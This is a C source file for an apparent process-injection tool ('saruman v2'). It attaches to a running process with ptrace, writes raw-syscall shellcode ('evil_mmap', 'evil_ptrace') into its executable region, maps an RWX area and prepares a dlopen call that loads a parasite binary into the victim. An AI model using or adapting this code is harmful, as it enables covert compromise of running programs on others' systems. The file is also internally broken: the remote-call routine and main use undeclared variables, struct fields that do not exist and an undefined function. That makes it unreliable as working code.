#include <sys/user.h>
#include <sys/ptrace.h>

#include "saruman_v2.h"

#define SIGCHLD		17
#define CLONE_VM	0x00000100	/* set if VM shared between processes */
#define CLONE_FS	0x00000200	/* set if fs info shared between processes */
#define CLONE_FILES	0x00000400	/* set if open files shared between processes */
#define CLONE_SIGHAND	0x00000800	/* set if signal handlers shared */

#define __NR_clone 56
#define __NR_exit 60

#define __PAYLOAD_ATTRIBUTES__	 __attribute__((aligned(8),__always_inline__))
#define __PAYLOAD_KEYWORDS__ static inline volatile

#define INIT_CODE_REGION 0x00C00000

#define PT_CALL_REGION_SIZE 4096 * 10
#define PT_CALL_REGION 0x000B0000

#define STACK_SIZE PAGE_SIZE * 4096

#define RPC_REGION

typedef struct saruman_ctx {
	elfobj_t elfobj;
	struct user_regs_struct pt_regs;
	struct user_regs_struct o_pt_regs;
	pid_t pid;
	char *exec_path;
	struct {
		uint8_t *base;
		uint64_t rsp, rbp;
		size_t len;
	} stack;
	struct {
		char **argv;
		int argc;
	} args;
	struct {
#define	PT_ATTACHED	(1UL << 0)
#define PT_DETACHED	(1UL << 1)
		pid_t pid;
		uint64_t flags;
	} task;
	struct {
		uint64_t executable_base_addr;
		size_t executable_len;
	} bootstrap;
	bool bootstrap_phase_complete;
} saruman_ctx_t;

typedef struct saruman_rpc {
	void * (*fn)(void);
	char **args;
	int argc;
	uint64_t retval;
} saruman_rpc_t;

#if defined DEBUG
	#define saruman_debug(...) {\
	do {\
		fprintf(stderr, "[%s:%s:%d] ", __FILE__, __func__, __LINE__); \
		fprintf(stderr, __VA_ARGS__);	\
	} while(0); \
}
#else
	#define saruman_debug(...)
#endif

#pragma GCC push_options
#pragma GCC optimize ("O0")

/*
 * A version of load_elf_binary() that works with PIE executables
 * only.
 */
#define __RTLD_DLOPEN 0x80000000 //glibc internal dlopen flag emulates dlopen behaviour

__PAYLOAD_KEYWORDS__ void * dlopen_loader(const char *path, uint64_t dlopen_addr)
{
	void * (*libc_dlopen)(const char *, int) = dlopen_addr;
	void *handle = (void *)0xfff; //initialized for debugging
	handle = libc_dlopen(path, __RTLD_DLOPEN|RTLD_NOW|RTLD_GLOBAL);
	__RETURN_VALUE__(handle);
	__BREAKPOINT__;
}
/*
 * A simplified load_elf_binary() function that loads the
 * position independent parasite executable into the remote
 * process address space (But would work with non PIE too)
 */
__PAYLOAD_KEYWORDS__ int evil_read(long fd, char *buf, unsigned long len)
{
	 long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
			"mov $0, %%rax\n"
			"syscall" : : "g"(fd), "g"(buf), "g"(len));
	asm("mov %%rax, %0" : "=r"(ret));
	return (int)ret;
}

__PAYLOAD_KEYWORDS__ long evil_open(const char *path, unsigned long flags)
{
	long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov $2, %%rax\n"
			"syscall" : : "g"(path), "g"(flags));

	asm ("mov %%rax, %0" : "=r"(ret));
	return ret;
}


__PAYLOAD_KEYWORDS__ int evil_brk(void *addr)
{
	long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov $12, %%rax\n"
			"syscall" : : "g"(addr));
	asm("mov %%rax, %0" : "=r"(ret));
	return (int)ret;
}


__PAYLOAD_KEYWORDS__ void * evil_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
{
	long mmap_fd = fd;
	unsigned long mmap_off = off;
	unsigned long mmap_flags = flags;
	unsigned long ret;

	__asm__ volatile(
			 "mov %0, %%rdi\n"
			 "mov %1, %%rsi\n"
			 "mov %2, %%rdx\n"
			 "mov %3, %%r10\n"
			 "mov %4, %%r8\n"
			 "mov %5, %%r9\n"
			 "mov $9, %%rax\n"
			 "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
	asm ("mov %%rax, %0" : "=r"(ret));
	return (void *)ret;
}

__PAYLOAD_KEYWORDS__ long evil_lseek(long fd, long offset, unsigned int whence)
{
	long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
			"mov $8, %%rax\n"
			"syscall" : : "g"(fd), "g"(offset), "g"(whence));
	asm("mov %%rax, %0" : "=r"(ret));
	return ret;

}

__PAYLOAD_KEYWORDS__ long evil_ptrace(long request, long pid, void *addr, void *data)

{
	long ret;

	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
			"mov %3, %%r10\n"
			"mov $101, %%rax\n"
			"syscall" : : "g"(request), "g"(pid), "g"(addr), "g"(data));
	asm("mov %%rax, %0" : "=r"(ret));

	return ret;
}

__PAYLOAD_KEYWORDS__ int evil_fstat(long fd, struct stat *buf)
{
	long ret;

	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov $5, %%rax\n"
			"syscall" : : "g"(fd), "g"(buf));
	asm("mov %%rax, %0" : "=r"(ret));

	return ret;
}

__PAYLOAD_KEYWORDS__ int create_thread(void (*fn)(void *), void *data, unsigned long stack)
{
	long retval;
	void **newstack;

	newstack = (void **)stack;
	*--newstack = data;

	__asm__ __volatile__(
		"syscall	\n\t"
		"test %0,%0	\n\t"
		"jne 1f		\n\t"
		"call *%3	\n\t"
		"mov %2,%0	\n\t"
		"xor %%r10, %%r10\n\t"
		"xor %%r8, %%r8\n\t"
		"xor %%r9, %%r9 \n\t"
		"int $0x80	\n\t"
		"1:\t"
		:"=a" (retval)
		:"0" (__NR_clone),"i" (__NR_exit),
		 "g" (fn),
		 "D" (CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | SIGCHLD),
		 "S" (newstack));

	if (retval < 0) {
		retval = -1;
		__RETURN_VALUE__(retval);
	}
	__BREAKPOINT__;
}

__PAYLOAD_KEYWORDS__ int evil_mprotect(void * addr, unsigned long len, int prot)
{
	volatile unsigned long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
			"mov $10, %%rax\n"
			"syscall" : : "g"(addr), "g"(len), "g"(prot));

	__asm__ volatile("mov %%rax, %0" : "=r"(ret));

}

__PAYLOAD_KEYWORDS__ int SYS_mprotect(void *addr, unsigned long len, int prot)
{
	int ret = evil_mprotect(addr, len, prot);

	__RETURN_VALUE__(ret);
	__BREAKPOINT__;
}


__PAYLOAD_KEYWORDS__ size_t evil_write(long fd, void *buf, unsigned long len)
{
	long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov %2, %%rdx\n"
			"mov $1, %%rax\n"
			"syscall" : : "g"(fd), "g"(buf), "g"(len));
	asm("mov %%rax, %0" : "=r"(ret));
	return ret;
}

__PAYLOAD_KEYWORDS__ uint64_t bootstrap_code(void * vaddr, uint64_t size, void *stack)
{
	volatile void *mem;

	 /*
	 * Create executable segment for ephemeral storage
	 * of code for custom procedure calls done through
	 * ptrace. These include syscalls (Such as SYS_mprotect)
	 * and other simple functions that we want to execute
	 * within the remote process.
	 */
	mem = evil_mmap((void *)PT_CALL_REGION,
			PT_CALL_REGION_SIZE,
			PROT_READ|PROT_WRITE|PROT_EXEC,
			MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,
			-1, 0);

	/*
	 * Create stack segment that will be used by the parasite
	 * thread.
	 */
	mem = evil_mmap(stack,
			STACK_SIZE,
			PROT_READ|PROT_WRITE,
			MAP_ANONYMOUS|MAP_PRIVATE|MAP_GROWSDOWN,
			-1, 0);

	__RETURN_VALUE__(mem);
	__BREAKPOINT__;
}


#pragma GCC pop_options
/*
 * This wrapper to waitpid() will restart waitpid
 * if it is interrupted by a signal.
 */

bool saruman_ptrace_write(struct saruman_ctx *ctx,
    void *dest, const void *src, size_t len)
{
	pid_t pid = ctx->task.pid;
	size_t rem = len % sizeof(void *);
	size_t quot = len / sizeof(void *);
	unsigned char *s = (unsigned char *) src;
	unsigned char *d = (unsigned char *) dest;

	while (quot-- != 0) {
		if ( ptrace(PTRACE_POKEDATA, pid, d, *(void **)s) == -1 )
			goto out_error;
		s += sizeof(void *);
		d += sizeof(void *);
	}

	if (rem != 0) {
		long w;
		unsigned char *wp = (unsigned char *)&w;

		w = ptrace(PTRACE_PEEKDATA, pid, d, NULL);
		if (w == -1 && errno != 0) {
			d -= sizeof(void *) - rem;

			w = ptrace(PTRACE_PEEKDATA, pid, d, NULL);
			if (w == -1 && errno != 0)
				goto out_error;

			wp += sizeof(void *) - rem;
		}

		while (rem-- != 0)
			wp[rem] = s[rem];

		if (ptrace(PTRACE_POKEDATA, pid, (void *)d, (void *)w) == -1)
			goto out_error;
	}

	return true;

out_error:
	fprintf(stderr, "saruman_ptrace_write() failed, pid: %d: %s\n", pid, strerror(errno));
	return false;
}

bool saruman_ptrace_read(struct saruman_ctx *ctx,
    void *dst, const void *src, size_t len)
{
	int sz = len / sizeof(void *);
	unsigned char *s = (unsigned char *)src;
	unsigned char *d = (unsigned char *)dst;
	long word;
	pid_t pid = ctx->task.pid;

	while (sz-- != 0) {
		word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
		if (word == -1 && errno) {
			fprintf(stderr, "saruman_ptrace_read() failed, pid: %d: %s\n", pid, strerror(errno));
			return false;
		}
		*(long *)d = word;
		s += sizeof(long);
		d += sizeof(long);
	}

	return true;
}

static int
waitpid2(pid_t pid, int *status, int options)
{
	pid_t ret;

	do {
		ret = waitpid(pid, status, options);
	} while (ret == -1 && errno == EINTR);

	return ret;
}

bool
saruman_ptrace_detach(saruman_ctx_t *ctx)
{
	pid_t pid = ctx->task.pid;

	if (ctx->task.flags & PT_DETACHED)
		return true;

	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
		if (errno) {
			fprintf(stderr,
			    "PTRACE_DETACH failed: %s\n", strerror(errno));
			return false;
		}
	}
	ctx->task.flags |= PT_DETACHED;
	saruman_debug("[+] PT_TID_DETACHED -> %d\n", pid);
	return 0;
}

bool
saruman_ptrace_attach(struct saruman_ctx *ctx)
{
	int status;

	if (ctx->task.flags & PT_ATTACHED)
		return true;

	if (ptrace(PTRACE_ATTACH, ctx->task.pid, NULL, NULL) < 0) {
		if (errno) {
			fprintf(stderr, "PTRACE_ATTACH failed: %s\n", strerror(errno));
			return false;
		}
	}
	do {
		/*
		 * Wait for the child to STOP
		 */
		if (waitpid2(ctx->task.pid, &status, 0) < 0)
			goto detach;

		/*
		 * Has the process actually stopped?
		 * If not goto detach
		 */
		if (!WIFSTOPPED(status))
			goto detach;

		/*
		 * Check the signal, is it actually SIGSTOP from us?
		 */
		if (WSTOPSIG(status) == SIGSTOP)
			break;

		/*
		 * If it wasn't our signal, but something else (i.e. SIGTRAP, SIGINT, etc.)
		 * then resume the process with the original signal. We re-inject the signal
		 * with WSTOPSIG(status)
		 */
		if (ptrace(PTRACE_CONT, ctx->task.pid, 0, WSTOPSIG(status)) == -1 )
			goto detach;
	} while(1);

	ctx->task.flags |= PT_ATTACHED;
	saruman_debug("[+] PT_TID_ATTACHED -> %d\n", ctx->task.pid);
	return true;


detach:
	/*
	 * Something went wrong
	 */
	fprintf(stderr, "Failed... detaching\n");
	saruman_ptrace_detach(ctx);
	return false;
}

bool saruman_find_bootloader_cave(struct saruman_ctx *ctx)
{
	FILE *fp;
	char path[4096], buf[4096];
	char *p;

	snprintf(path, 4096, "/proc/%d/maps", ctx->task.pid);
	fp = fopen(path, "r");
	if (fp == NULL) {
		perror("fopen");
		return false;
	}
	/*
	 * Find the first instance of r-xp region of the main
	 * executable.
	 */
	while (fgets(buf, sizeof(buf), fp) != NULL) {
		if (strstr(buf, "r-xp") == NULL)
			continue;
		if (strchr(buf, '/') == NULL)
			continue;
		p = strchr(buf, '-');
		*p = '\0';
		ctx->bootstrap.executable_base_addr =
		    strtoul(buf, NULL, 16);
		ctx->bootstrap.executable_len =
		    strtoul((p + 1), NULL, 16) - ctx->bootstrap.executable_base_addr;
		return true;
	}

	return false;
}

bool saruman_store_register_state(struct saruman_ctx *ctx)
{
	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &ctx->o_pt_regs) < 0) {
		perror("PTRACE_GETREGS");
		return -1;
	}

	memcpy((void *)&ctx->pt_regs,
	    (void *)&ctx->o_pt_regs,
	    sizeof(struct user_regs_struct));
	return 0;
}

void saruman_remote_call_init(struct saruman_rpc *rpc, void *fn, size_t fn_len,
    char **args, int argc) 
{
	rpc->fn = (void *)fn;
	rpc->fn_len = fn_len;
	rpc->args = args;
	rpc->argc = argc;

	return;
}

bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
{
	bool res;
	uint64_t addr;

	if (ptrace(PTRACE_GETREGS, ctx->task.pid, NULL, &ctx->pt_regs) < 0) {
		perror("ptrace");
		return false;
	}

	addr = ctx->bootstrap_phase_complete ?
	    PT_CALL_REGION : ctx->bootstrap.executable_base_addr;

	res = saruman_ptrace_write(ctx, addr, rpc->fn, rpc->fn_len);
	if (res == false) {
		fprintf(stderr, "saruman_ptrace_write() failed on pid %d\n", ctx->task.pid);
		return false;
	}
	
	ctx->pt_regs.rip = ctx->bootstrap.executable_base_addr;
	switch(rpc->argc) {
	case 1:
		pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
		break;
	case 2:
		pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
		pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
		break;
	case 3:
		pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
		pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
		pt_reg->rdx = (uintptr_t)h->payloads.function[func].args[2];
		break;
	case 4:
		pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
		pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
		pt_reg->rdx = (uintptr_t)h->payloads.function[func].args[2];
		pt_reg->rcx = (uintptr_t)h->payloads.function[func].args[3];
		break;
	case 5:
		pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
		pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
		pt_reg->rdx = (uintptr_t)h->payloads.function[func].args[2];
		pt_reg->rcx = (uintptr_t)h->payloads.function[func].args[3];
		pt_reg->r8 =  (uintptr_t)h->payloads.function[func].args[4];
		break;
	case 6:
		pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
		pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
		pt_reg->rdx = (uintptr_t)h->payloads.function[func].args[2];
		pt_reg->rcx = (uintptr_t)h->payloads.function[func].args[3];
		pt_reg->r8 =  (uintptr_t)h->payloads.function[func].args[4];
		pt_reg->r9 =  (uintptr_t)h->payloads.function[func].args[5];
		break;
	}
	if (ptrace(PTRACE_SETREGS, ctx->task.pid, NULL, &ctx->pt_reg) < 0) {
		perror("ptrace setregs");
		return false;
	}
	if (ptrace(PTRACE_CONT, h->tasks.pid, NULL, NULL) < 0) {
		perror("ptrace cont");
		return false;
	}
	waitpid2(h->tasks.pid, &status, 0);

	if (WSTOPSIG(status) != SIGTRAP) {
		fprintf(stderr,
		    "[!] No SIGTRAP received, something went wrong. Signal: %d\n",
		    WSTOPSIG(status));
		return false;
	}
	/* Get return value */
	if (ptrace(PTRACE_GETREGS, h->tasks.pid, NULL, pt_reg) < 0) {
		perror("PTRACE_GETREGS");
		return -1;
	}
	rpc->retval = ctx->pt_reg->rax;
	return true;
}

bool saruman_run_boostrap(struct saruman_ctx *ctx)
{
	size_t len = sizeof(bootstrap_code);
	struct saruman_rpc rpc;

	saruman_debug("Writing %zu bytes of bootstrap code into %p\n",
	    len, (void *)ctx->bootstrap.executable_base_addr);

	char *argv[] = {PT_CALL_REGION, PT_CALL_REGION_SIZE, 0x0};
	saruman_remote_call_init(&rpc, &bootstrap_code, argv, 3);
	if (saruman_remote_call(ctx, &rpc) == false) {
		fprintf(stderr, "saruman_remote_call() failed on: run_bootstrap()\n");
		return false;
	}
	ctx->bootstrap_phase_complete = true;
	return true;
}

int main(int argc, char **argv)
{
	struct saruman_ctx saruman;

	memset(&saruman, 0, sizeof(saruman));

	if (argc < 3) {
		printf("Usage: %s <pid> <exec_path> <exec_args>\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	saruman.task.pid = atoi(argv[1]);
	saruman.exec_path = strdup(argv[2]);
	if (saruman.exec_path == NULL) {
		perror("strdup");
		exit(EXIT_FAILURE);
	}
	saruman.args.argv = &argv[2];
	argc = argc - 1;

	if (saruman_ptrace_attach(&saruman) == false) {
		fprintf(stderr, "saruman_ptrace_attach() failedon pid: %d\n",
		    saruman.task.pid);
		exit(EXIT_FAILURE);
	}

	if (saruman_store_register_state(&saruman) == false) {
		fprintf(stderr, "saruman_store_register_state() failedon pid: %d\n",
		    saruman.task.pid);
		exit(EXIT_FAILURE);
	}

	printf("Finding bootloader cave\n");

	if (saruman_find_bootloader_cave(&saruman) == false) {
		fprintf(stderr, "saruman_find_bootloader_cave() failed on pid: %d\n",
		    saruman.task.pid);
		exit(EXIT_FAILURE);
	}
	printf("Bootstrap executable region: %#lx - %#lx\n",
	    saruman.bootstrap.executable_base_addr, saruman.bootstrap.executable_len);

	/*
	 * Call dlopen_loader(exec_path, exec_args, parasite_argc)
	 */

	uint64_t dlopen_addr = saruman_find_libc_dlopen(&saruman);
	if (dlopen_addr == 0) {
		fprintf(stderr, "Failed to find dlopen()\n");
		exit(EXIT_FAILURE);
	}

	char *dlopen_loader_args[] = {argv[2], dlopen_addr};
	saruman_remote_call_init(&rpc, &dlopen_loader, sizeof(dlopen_loader),
	    dlopen_loader_args, 2);
	saruman_remote_call(&saruman, &rpc);
}


